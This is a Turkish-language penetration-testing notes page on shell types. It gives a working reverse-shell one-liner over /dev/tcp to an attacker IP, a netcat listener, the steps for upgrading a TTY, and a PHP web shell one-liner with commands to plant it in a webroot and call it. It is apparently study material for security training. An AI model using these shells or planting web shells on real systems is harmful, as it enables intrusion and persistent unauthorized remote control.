---
glightbox: true
icon: material/circle-small
---

# Types of Shells

## Reverse Shell

Reverse shell, kontrol elde etmenin en hızlı ve en kolay yöntemi olduğundan en yaygın shell türüdür. Saldırı makinemizdeki dinleyiciye geri bağlantı başlatır.

### Netcat Listener

Reverse shell almak için ilk adım seçilen bir port için Netcat dinleyicisi başlatmaktır:

```bash
nc -l -v -n -p 2222
```

| Flag | Description |
|---|---|
| `-l` | Bir bağlantının bağlanması beklenir. |
| `-v` | Ayrıntılı mod kullanılır. |
| `-n` | Bağlantıyı hızlandırmak için DNS çözümlemesi devre dışı bırakılır. |
| `-p` | Port numarası belirtilir. |

### Reverse Shell Command

[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) reposunda bulunan [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) sayfasında reverse shell için kullanılabilecek çeşitli komutların bir listesi bulunur.

Aşağıda örnek bir reverse shell komutu verilmiştir:

```bash
bash -c 'bash -i &> /dev/tcp/10.0.2.6/2222 0<&1'
```

Bu komut hedef makinede çalıştırıldığında Netcat tarafında bağlantı alınabilir.

## Bind Shell

Hedef bilgisayardaki belirli bir porta bağlanır ve saldırı makinesinden bağlantı bekler. [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) sayfasında bind shell için kullanılabilecek çeşitli komutların bir listesi bulunur.

## Upgrading TTY

Uzak bir shell bağlantısı gerçekleştirdiğimizde son derece sınırlı bir TTY oturumuna sahip oluruz. TTY yükseltmesi gerçekleştirerek bu sorunu çözebiliriz.

!!! failure "ZSH"

    Burada bahsedilen işlemler ZSH için çalışmayabilir. Bu sebeple ilk önce Bash shell ile oturum açmak gerekebilir.

TTY yükseltmek için kullanılan yöntemlerden biri python/stty yöntemidir. Bu yöntemde Netcat ile dinleme gerçekleştirdiğimiz shell Full TTY yapılır:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Bu komutun ardından ++control+z++ ile shell arka plana taşınır. Bu şekilde yerel terminale geri dönülür. Sonrasında aşağıdaki komut ile `ECHO` özelliği devre dışı bırakılır:

```bash
stty raw -echo
```

Bu işlemin ardından Netcat shell tekrar ön plana taşınır (`ECHO` devre dışı olduğu için `fg` komutu ekranda gözükmez):

```bash
fg
```

Netcat shell için terminal değişkeni ayarlanır:

```bash
export TERM=xterm
```

Ek olarak terminalin boyut bilgisini de iyileştirebiliriz. Bunun için yerel terminalde aşağıdaki komut kullanılır:

```bash
stty size
```

Burada edinilen bilgiler Netcat shell içerisine kopyalanır:

```bash
stty rows 30 columns 120
```

Son olarak terminal sıfırlanır:

```bash
reset
```

## Web Shell

Web shell, HTTP GET veya HTTP POST istek parametreleri aracılığıyla verilen komutları kabul eder, bu komutları yürütür ve sonuçları web sayfasına yazdırır.

### Writing a Web Shell

Web shell, genellikle kısa ve tek satırlık (one-liner) bir komut dosyasıdır. Aşağıda PHP için örnek bir web shell verilmiştir:

```php
<?php system($_REQUEST["cmd"]); ?>
```

### Uploading a Web Shell

Web shell dosyasını web tarayıcısı aracılığıyla yürütmek için, ilgili dosya, uzak bilgisayarın web köküne (webroot) yerleştirilmelidir.

Aşağıda bazı web sunucuları için varsayılan web kökleri verilmiştir:

| Web Server | Default Webroot |
|---|---|
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

Örneğin Apache çalıştıran bir Linux bilgisayarına saldırıyorsak aşağıdaki komutu kullanabiliriz:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Accessing a Web Shell

Parametre olarak `id` değeri verilerek `id` komutunun çalıştırılması sağlanabilir:

```bash
curl http://SERVER_IP_ADDRESS:PORT/shell.php?cmd=id
```

```text title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bir web shell, port üzerinde yeni bir bağlantı açmaz. Bu sayede bazı güvenlik duvarı kısıtlamaları atlanabilir. Ayrıca hedef bilgisayar yeniden başlatılsa bile, web shell yerinde kalmaya devam eder.
